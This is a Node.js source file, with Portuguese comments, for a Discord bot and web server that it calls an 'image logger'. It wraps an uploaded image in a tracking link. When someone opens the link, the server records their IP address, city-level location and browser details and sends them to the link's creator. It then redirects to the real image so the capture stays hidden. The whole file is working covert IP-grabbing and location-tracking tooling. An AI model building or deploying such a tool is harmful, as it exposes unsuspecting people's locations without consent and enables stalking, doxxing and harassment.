const { Client, GatewayIntentBits, Collection } = require('discord.js');
const express = require('express');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');

const storage = require('./utils/storage');

// ===== DISCORD BOT =====
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

client.commands = new Collection();

// Carrega comandos
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
  const command = require(path.join(commandsPath, file));
  client.commands.set(command.name, command);
}

// Evento: bot pronto
client.once('ready', () => {
  console.log(`🤖 Bot logado como ${client.user.tag}`);
});

// Evento: mensagens
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  
  const prefix = '!';
  if (!message.content.startsWith(prefix)) {
    // Verifica se está aguardando imagem
    if (client.awaitingImage?.[message.author.id]) {
      const attachment = message.attachments.first();
      
      if (!attachment || !attachment.contentType?.startsWith('image/')) {
        delete client.awaitingImage[message.author.id];
        return message.reply('❌ Isso não é uma imagem!');
      }
      
      // Cria link
      const link = storage.createLink(message.author.id, attachment.url);
      const domain = process.env.DOMAIN || `http://localhost:${process.env.PORT || 3000}`;
      
      delete client.awaitingImage[message.author.id];
      
      return message.reply(
        `✅ **Link gerado!**\n\n` +
        `🔗 \`${domain}/i/${link.id}\`\n\n` +
        `Quando alguém clicar, você recebe os dados no canal de logs!`
      );
    }
    return;
  }
  
  // Processa comandos
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  
  const command = client.commands.get(commandName);
  if (!command) return;
  
  try {
    await command.execute(message, client);
  } catch (error) {
    console.error(error);
    message.reply('❌ Erro ao executar comando!');
  }
});

// ===== SERVIDOR WEB =====
const app = express();

app.get('/i/:id', async (req, res) => {
  const link = storage.getLink(req.params.id);
  if (!link) return res.status(404).send('Link não encontrado');
  
  // Coleta dados
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
  const geo = geoip.lookup(ip);
  
  const logData = {
    ip,
    location: geo ? `${geo.city}, ${geo.region}, ${geo.country}` : 'Desconhecido',
    userAgent: req.headers['user-agent'],
    time: new Date().toLocaleString('pt-BR')
  };
  
  // Salva log
  storage.addLog(req.params.id, logData);
  
  // Envia pro Discord
  const channelId = storage.getLogChannel(link.userId);
  
  try {
    // Tenta canal configurado
    if (channelId) {
      const channel = await client.channels.fetch(channelId);
      if (channel) {
        await channel.send(
          `📸 **NOVO CLICK!**\n` +
          `IP: \`${logData.ip}\`\n` +
          `📍 Local: ${logData.location}\n` +
          `⏰ Horário: ${logData.time}`
        );
      }
    }
    
    // Tenta DM
    const user = await client.users.fetch(link.userId);
    await user.send(
      `📸 Alguém clicou no seu link!\n\n` +
      `IP: \`${logData.ip}\`\n` +
      `Localização: ${logData.location}\n` +
      `Horário: ${logData.time}`
    );
  } catch (e) {
    console.log('Erro ao enviar log:', e.message);
  }
  
  // Redireciona pra imagem real
  res.redirect(link.imageUrl);
});

app.get('/', (req, res) => {
  res.json({ status: 'online', bot: 'discord-image-logger' });
});

// ===== INICIA TUDO =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🌐 Servidor rodando na porta ${PORT}`);
});

client.login(process.env.DISCORD_TOKEN);
